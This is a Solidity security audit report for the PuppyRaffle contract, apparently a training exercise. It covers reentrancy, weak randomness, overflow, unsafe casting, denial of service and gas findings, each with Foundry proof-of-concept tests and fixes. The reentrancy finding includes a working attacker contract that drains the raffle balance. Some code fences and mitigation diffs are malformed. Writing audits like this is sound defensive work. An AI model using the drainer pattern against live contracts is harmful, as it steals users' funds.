### [H-1] Reentrancy attack in `PuppyRaffle::refund` allow entrant to drain raffle balance

**Description:** `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interfactions) and as
a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only
after making that external call do we update the `PuppyRaffle::players` array.

```javascript
function refund(uint256 playerIndex) public {
        // written-skipped MEV
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // @audit Reentrancy
 @>     payable(msg.sender).sendValue(entranceFee);
 @>     players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code:**

<details>
<summary>Code</summary>

Place the following into `PuppyRaffleTest.sol`

```javascript
function test_reentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attackerUser = makeAddr("attackUser");
        vm.deal(attackerUser, 1 ether);

        uint256 startingAttackContractBalance = address(attackerContract).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        // attack
        vm.prank(attackerUser);
        attackerContract.attack{value: entranceFee}();

        console.log("starting attacker contract balance: ", startingAttackContractBalance);
        console.log("starting contract contract balance: ", startingContractBalance);

        console.log("ending attacker contract balance: ", address(attackerContract).balance);
        console.log("ending contract contract balance: ", address(puppyRaffle).balance);
    }

```

And this contract as well.

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle:refund`
function update the `players` array before making the external call. Additionally, we
should move the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner

**Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

**Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.

**Proof of Concept:**

There are a few attack vectors here.

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
2. Users can manipulate the `msg.sender` value to result in their index being the winner.

Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

### [M-1] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows.

```javascript
uint64 myVar = type(uint64).max;
// myVar will be 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. We first conclude a raffle of 4 players to collect some fees.
2. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
3. `totalFees` will be:

```javascript
totalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow, the following is now the case
totalFees = 153255926290448384;
```

4. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:

```javascript
require(address(this).balance ==
  uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

<details>
<summary>Proof Of Code</summary>
Place this into the `PuppyRaffleTest.t.sol` file.

```javascript
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

</details>

**Recommended Mitigation:** There are a few recommended mitigations here.

1. Use a newer version of Solidity that does not allow integer overflows by default.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity ^0.8.18;
```

Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

2. Use a `uint256` instead of a `uint64` for `totalFees`.

```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;
```

3. Remove the balance check in `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

### [M-2] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the players array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the players array, is an additional check the loop will have to make.

**Impact:** The impact is two-fold.

1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.
2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: 6252039
- 2nd 100 players: 18067741

This is more than 3x as expensive for the second set of 100 players!

This is due to the for loop in the `PuppyRaffle::enterRaffle` function.

```javascript
        // Check for duplicates
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

<details>
<summary>Proof Of Code</summary>
Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
function testReadDuplicateGasCosts() public {
        vm.txGasPrice(1);

        // We will enter 5 players into the raffle
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        // And see how much gas it cost to enter
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 1st 100 players:", gasUsedFirst);

        // We will enter 5 more players into the raffle
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i + playersNum);
        }
        // And see how much more expensive it is
        gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        gasEnd = gasleft();
        uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
        console.log("Gas cost of the 2nd 100 players:", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
        // Logs:
        //     Gas cost of the 1st 100 players: 6252039
        //     Gas cost of the 2nd 100 players: 18067741
}
```

</details>

**Recommended Mitigation:** There are a few recommended mitigations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

**Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

```javascript
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length > 0, "PuppyRaffle: No players in raffle");

        uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 fee = totalFees / 10;
        uint256 winnings = address(this).balance - fee;
@>      totalFees = totalFees + uint64(fee);
        players = new address[](0);
        emit RaffleWinner(winner, winnings);
    }
```

The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

**Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**

1. A raffle proceeds with a little more than 18 ETH worth of fees collected
2. The line that casts the `fee` as a `uint64` hits
3. `totalFees` is incorrectly updated with a lower amount

You can replicate this in foundry's chisel by running the following:

```javascript
uint256 max = type(uint64).max
uint256 fee = max + 1
uint64(fee)
// prints 0
```

**Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

```javascript
// We do some storage packing to save gas
```

But the potential gas saved isn't worth it if we have to recast and this bug exists.

```diff
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
.
.
.
    function selectWinner() external {
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
        require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
        address winner = players[winnerIndex];
        uint256 totalAmountCollected = players.length * entranceFee;
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
-       totalFees = totalFees + uint64(fee);
+       totalFees = totalFees + fee;
```

### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)

# Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` return 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
    // @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` return 0
3. User thinks they have not entered correctly due to the function documentation

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

You could also reserve the 0th position for any compettion, but a better solution might be to return an `uint256` where the function returns -1 if the player is not active.

# Gas

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading from a constant or immutable variable.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

```diff
+           uint256 playerLength = players.length;
-           for (uint256 i = 0; i < players.length - 1; i++) {
+           for (uint256 i = 0; i < playerLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playerLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

### [I-1] Solidity pragma should be specific, not wide

Consider using a specific version of Solidity in your contracts instead of a wide version.
For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol 32:23:25

### [I-2] Using an outdated version of Solidity is not recommanded.

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation:**
Deploy with any of the following Solidity versions:

`0.8.18`
The recommendations take into account:
Risks related to recent releases
Risks of complex code generation changes
Risks of new language features
Risks of known bugs
Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation) documentation more information

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Assigning values to address state variables without checking for `address(0)`.

- Found in src/PuppyRaffle.sol [Line: 65](src/PuppyRaffle.sol#L65)

  ```solidity
          feeAddress = _feeAddress;
  ```

- Found in src/PuppyRaffle.sol [Line: 180](src/PuppyRaffle.sol#L180)

  ```solidity
          previousWinner = winner; // e vanity, doesn't matter much
  ```

- Found in src/PuppyRaffle.sol [Line: 206](src/PuppyRaffle.sol#L206)

  ```solidity
          feeAddress = newFeeAddress;
  ```

```

```

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice

It's best to keep code clean and follow CEI

```diff
        // @audit the winner wouldn't get the money if thier fallback was messed up!
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Magic Numbers

**Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

**Recommended Mitigation:** Replace all magic numbers with constants.

```diff
+       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+       uint256 public constant FEE_PERCENTAGE = 20;
+       uint256 public constant TOTAL_PERCENTAGE = 100;
.
.
.
-        uint256 prizePool = (totalAmountCollected * 80) / 100;
-        uint256 fee = (totalAmountCollected * 20) / 100;
         uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
         uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
```

### [I-6] Unchanged variables should be constant or immutable

Constant Instances:

```
PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#35) should be constant
PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#45) should be constant
PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#40) should be constant
```

Immutable Instances:

```
PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#21) should be immutable

### [I-7] Potentially erroneous active player index

**Description:** The `getActivePlayerIndex` function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the `players` array. This may cause confusions for users querying the function to obtain the index of an active player.

**Recommended Mitigation:** Return 2\*\*256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.

### [I-8] Zero address may be erroneously considered an active player

**Description:** The `refund` function removes active players from the `players` array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that "This function will allow there to be blank spots in the array". However, this is not taken into account by the `getActivePlayerIndex` function. If someone calls `getActivePlayerIndex` passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the `players` array.

**Recommended Mitigation:** Skip zero addresses when iterating the `players` array in the `getActivePlayerIndex`. Do note that this change would mean that the zero address can _never_ be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `enterRaffle` function.
